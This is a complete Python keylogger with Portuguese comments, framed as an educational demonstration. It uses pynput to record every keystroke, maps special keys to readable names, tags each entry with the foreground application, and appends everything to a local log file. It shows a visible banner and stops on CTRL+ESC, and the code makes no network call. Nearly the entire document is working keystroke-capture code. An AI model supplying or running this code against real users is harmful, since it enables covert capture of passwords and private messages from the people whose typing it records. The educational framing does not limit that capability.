import os
import datetime
from pynput import keyboard
import psutil
import ctypes
import sys

# ── Configurações ──────────────────────────────────────────────
NOME_ARQUIVO_LOG = "log_keylogger.txt"
PASTA_SCRIPT     = os.path.dirname(os.path.abspath(__file__))
CAMINHO_LOG      = os.path.join(PASTA_SCRIPT, NOME_ARQUIVO_LOG)

app_atual        = "Desconhecido"   # Guarda o app em foco atual


# ══════════════════════════════════════════════════════════════
#  FUNÇÕES AUXILIARES
# ══════════════════════════════════════════════════════════════

def banner_educacional():
    """Exibe aviso educacional ao iniciar o programa."""
    print("\n" + "═" * 60)
    print("  ⚠️   KEYLOGGER EDUCACIONAL — USO DIDÁTICO APENAS   ⚠️")
    print("═" * 60)
    print("  📚 Objetivo : Demonstrar riscos de segurança digital")
    print("  🔒 Alcance  : Apenas esta máquina, sem envio de dados")
    print("  📁 Log salvo: log_keylogger.txt (mesma pasta)")
    print("  🛑 Parar    : Pressione CTRL + ESC")
    print("═" * 60)
    print(f"  ▶ Iniciado em: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    print("═" * 60 + "\n")


def obter_app_ativo():
    """Retorna o nome do processo/app que está em foco no momento."""
    try:
        # Windows: usa ctypes para pegar o PID da janela em foco
        if sys.platform == "win32":
            import ctypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            pid  = ctypes.c_ulong()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            processo = psutil.Process(pid.value)
            return processo.name().replace(".exe", "")

        # Linux/macOS: fallback simples
        else:
            for proc in psutil.process_iter(["pid", "name", "status"]):
                if proc.info["status"] == psutil.STATUS_RUNNING:
                    return proc.info["name"]
    except Exception:
        pass
    return "Desconhecido"


def registrar(mensagem: str):
    """
    Imprime a mensagem no terminal com timestamp
    e salva no arquivo de log.
    """
    agora     = datetime.datetime.now().strftime("%H:%M:%S")
    linha     = f"[{agora}]  {mensagem}"

    # Terminal
    print(linha)

    # Arquivo
    with open(CAMINHO_LOG, "a", encoding="utf-8") as f:
        f.write(linha + "\n")


# ══════════════════════════════════════════════════════════════
#  MAPEAMENTO DE TECLAS ESPECIAIS → NOMES LEGÍVEIS
# ══════════════════════════════════════════════════════════════

TECLAS_ESPECIAIS = {
    keyboard.Key.space      : "ESPAÇO",
    keyboard.Key.enter      : "ENTER",
    keyboard.Key.backspace  : "BACKSPACE",
    keyboard.Key.tab        : "TAB",
    keyboard.Key.shift      : "SHIFT",
    keyboard.Key.shift_r    : "SHIFT (direito)",
    keyboard.Key.ctrl_l     : "CTRL (esquerdo)",
    keyboard.Key.ctrl_r     : "CTRL (direito)",
    keyboard.Key.alt_l      : "ALT (esquerdo)",
    keyboard.Key.alt_r      : "ALT (direito)",
    keyboard.Key.caps_lock  : "CAPS LOCK",
    keyboard.Key.esc        : "ESC",
    keyboard.Key.delete     : "DELETE",
    keyboard.Key.up         : "↑ (cima)",
    keyboard.Key.down       : "↓ (baixo)",
    keyboard.Key.left       : "← (esquerda)",
    keyboard.Key.right      : "→ (direita)",
    keyboard.Key.home       : "HOME",
    keyboard.Key.end        : "END",
    keyboard.Key.page_up    : "PAGE UP",
    keyboard.Key.page_down  : "PAGE DOWN",
    keyboard.Key.f1         : "F1",  keyboard.Key.f2  : "F2",
    keyboard.Key.f3         : "F3",  keyboard.Key.f4  : "F4",
    keyboard.Key.f5         : "F5",  keyboard.Key.f6  : "F6",
    keyboard.Key.f7         : "F7",  keyboard.Key.f8  : "F8",
    keyboard.Key.f9         : "F9",  keyboard.Key.f10 : "F10",
    keyboard.Key.f11        : "F11", keyboard.Key.f12 : "F12",
}


# ══════════════════════════════════════════════════════════════
#  LISTENERS DE TECLADO
# ══════════════════════════════════════════════════════════════

# Controle do atalho de parada (CTRL + ESC)
teclas_pressionadas = set()

def ao_pressionar(tecla):
    """Chamado a cada tecla pressionada."""
    global app_atual

    teclas_pressionadas.add(tecla)

    # ── Verifica atalho de parada: CTRL + ESC ──────────────────
    if (keyboard.Key.ctrl_l in teclas_pressionadas or
            keyboard.Key.ctrl_r in teclas_pressionadas) and \
            keyboard.Key.esc in teclas_pressionadas:
        registrar("🛑 Keylogger encerrado pelo usuário (CTRL + ESC)")
        print("\n" + "═" * 60)
        print("  ✅ Sessão encerrada. Log salvo em:")
        print(f"     {CAMINHO_LOG}")
        print("═" * 60 + "\n")
        return False  # Para o listener

    # ── Detecta mudança de aplicativo ─────────────────────────
    app_novo = obter_app_ativo()
    if app_novo != app_atual:
        app_atual = app_novo
        registrar(f"📱 App em foco → [{app_atual}]")

    # ── Registra a tecla ──────────────────────────────────────
    if hasattr(tecla, "char") and tecla.char is not None:
        # Tecla comum (letra, número, símbolo)
        registrar(f"⌨️  Tecla normal   → '{tecla.char}'   | App: {app_atual}")
    else:
        # Tecla especial
        nome = TECLAS_ESPECIAIS.get(tecla, str(tecla).replace("Key.", "").upper())
        registrar(f"🔑 Tecla especial → [{nome}]   | App: {app_atual}")


def ao_soltar(tecla):
    """Remove a tecla do set quando solta (para atalhos combinados)."""
    teclas_pressionadas.discard(tecla)


# ══════════════════════════════════════════════════════════════
#  INICIALIZAÇÃO
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    banner_educacional()

    # Cria/limpa o arquivo de log com cabeçalho
    with open(CAMINHO_LOG, "w", encoding="utf-8") as f:
        f.write("=" * 60 + "\n")
        f.write("  LOG — KEYLOGGER EDUCACIONAL\n")
        f.write(f"  Sessão: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")

    # Inicia o listener (bloqueante até retornar False)
    with keyboard.Listener(
        on_press   = ao_pressionar,
        on_release = ao_soltar
    ) as listener:
        listener.join()
